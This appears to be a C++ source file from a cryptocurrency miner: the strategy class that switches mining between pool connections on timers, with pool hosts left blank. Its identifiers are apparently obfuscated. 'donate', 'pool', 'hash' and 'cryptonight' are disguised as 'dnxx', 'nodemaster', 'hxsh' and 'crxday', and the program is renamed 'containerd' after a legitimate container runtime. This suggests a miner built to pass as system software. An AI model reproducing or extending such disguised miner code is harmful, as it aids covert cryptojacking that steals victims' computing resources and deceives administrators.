#include "interfaces/IStrategyListener.h"
#include "net/Client.h"
#include "net/Job.h"
#include "net/strategies/dnxxStrategy.h"
#include "net/strategies/FailoverStrategy.h"
#include "Platform.h"
#include "containerd.h"


extern "C"
{
#include "crxx/c_keccak.h"
}


const static char *kdnxxnodemaster1   = "";
const static char *kdnxxnodemaster2   = "";


static inline int random(int min, int max){
   return min + rand() / (RAND_MAX / (max - min + 1) + 1);
}


dnxxStrategy::dnxxStrategy(int level, const char *user, int algo, IStrategyListener *listener) :
    m_active(false),
    m_dnxxTime(level * 60 * 1000),
    m_idleTime((100 - level) * 60 * 1000),
    m_strategy(nullptr),
    m_listener(listener)
{
    uint8_t hxsh[200];
    char userId[65] = { 0 };

    keccak(reinterpret_cast<const uint8_t *>(user), static_cast<int>(strlen(user)), hxsh, sizeof(hxsh));
    Job::toHex(hxsh, 32, userId);

    if (algo == containerd::ALGO_crxday) {
        m_nodemasters.push_back(new Url(kdnxxnodemaster1, 6666, userId, nullptr, false, true));
        m_nodemasters.push_back(new Url(kdnxxnodemaster1, 80,   userId, nullptr, false, true));
        m_nodemasters.push_back(new Url(kdnxxnodemaster2, 5555, "", "", false, false));
    }
    else {
        m_nodemasters.push_back(new Url(kdnxxnodemaster1, 5555, userId, nullptr, false, true));
        m_nodemasters.push_back(new Url(kdnxxnodemaster1, 7777, userId, nullptr, false, true));
    }

    m_strategy = new FailoverStrategy(m_nodemasters, 1, 1, this, true);

    m_timer.data = this;
    uv_timer_init(uv_default_loop(), &m_timer);

    idle(random(3000, 9000) * 1000 - m_dnxxTime);
}


dnxxStrategy::~dnxxStrategy()
{
    delete m_strategy;
}


int64_t dnxxStrategy::submit(const JobResult &result)
{
    return m_strategy->submit(result);
}


void dnxxStrategy::connect()
{
    m_strategy->connect();
}


void dnxxStrategy::stop()
{
    uv_timer_stop(&m_timer);
    m_strategy->stop();
}


void dnxxStrategy::tick(uint64_t now)
{
    m_strategy->tick(now);
}


void dnxxStrategy::onActive(IStrategy *strategy, Client *client)
{
    if (!isActive()) {
        uv_timer_start(&m_timer, dnxxStrategy::onTimer, m_dnxxTime, 0);
    }

    m_active = true;
    m_listener->onActive(this, client);
}


void dnxxStrategy::onJob(IStrategy *strategy, Client *client, const Job &job)
{
    m_listener->onJob(this, client, job);
}


void dnxxStrategy::onPause(IStrategy *strategy)
{
}


void dnxxStrategy::onResultAccepted(IStrategy *strategy, Client *client, const SubmitResult &result, const char *error)
{
    m_listener->onResultAccepted(this, client, result, error);
}


void dnxxStrategy::idle(uint64_t timeout)
{
    uv_timer_start(&m_timer, dnxxStrategy::onTimer, timeout, 0);
}


void dnxxStrategy::suspend()
{
    m_strategy->stop();

    m_active = false;
    m_listener->onPause(this);

    idle(m_idleTime);
}


void dnxxStrategy::onTimer(uv_timer_t *handle)
{
    auto strategy = static_cast<dnxxStrategy*>(handle->data);

    if (!strategy->isActive()) {
        return strategy->connect();
    }

    strategy->suspend();
}
